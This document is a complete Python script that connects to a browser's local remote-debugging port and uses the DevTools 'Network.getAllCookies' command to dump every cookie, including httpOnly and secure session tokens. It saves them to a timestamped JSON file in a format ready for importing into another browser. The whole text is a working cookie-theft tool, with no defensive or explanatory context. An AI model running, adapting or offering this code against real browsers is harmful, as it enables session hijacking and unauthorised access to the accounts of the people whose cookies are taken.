import json, requests, argparse, websocket
from datetime import datetime

def grab_cookies(websocket_url):
    ws = websocket.create_connection(websocket_url)
    ws.send(json.dumps({"id": 1, "method": "Network.getAllCookies"}))
    result = ws.recv()
    ws.close()

    response = json.loads(result)
    cookies = response["result"]["cookies"]

    return cookies

def grab_websocket_url(url):
    response = requests.get(url)
    websocket_url = response.json()[0].get("webSocketDebuggerUrl")
    return websocket_url

def argparse_args():
    parser = argparse.ArgumentParser(description="Grab cookies from a remote debugger")
    parser.add_argument("-p","--port", type=str, help="The Port of the remote debugger", required=True)
    return parser.parse_args()

def main():
    args = argparse_args()
    port = args.port
    url = f"http://localhost:{port}/json"

    websocket_url = grab_websocket_url(url)
    
    print(f"WebSocket URL: {websocket_url}")

    cookies = grab_cookies(websocket_url)
    final =[]
    for c in cookies:
        same_site = c.get("sameSite", "lax")
        if same_site == "None" or same_site == "Lax":
            same_site = "lax"
        cookie = {
            "domain": c["domain"],
            "expirationDate": c["expires"],
            "hostOnly": not c["domain"].startswith("."),
            "httpOnly": c["httpOnly"],
            "name": c["name"],
            "path": c["path"],
            "sameSite": same_site,
            "secure": c["secure"],
            "session": c["session"],
            "storeId": c.get("storeId", "None"),
            "value": c["value"]
        }
        
        final.append(cookie)

    cookie_file_name = "cookie_" +datetime.now().strftime("%Y-%m-%d_%H-%M-%S") + ".json"
    with open(cookie_file_name, 'w') as f:
        json.dump(final, f, indent=4, sort_keys=True)
    print("Cookies saved to " + cookie_file_name)
    
if __name__ == "__main__":
    main()
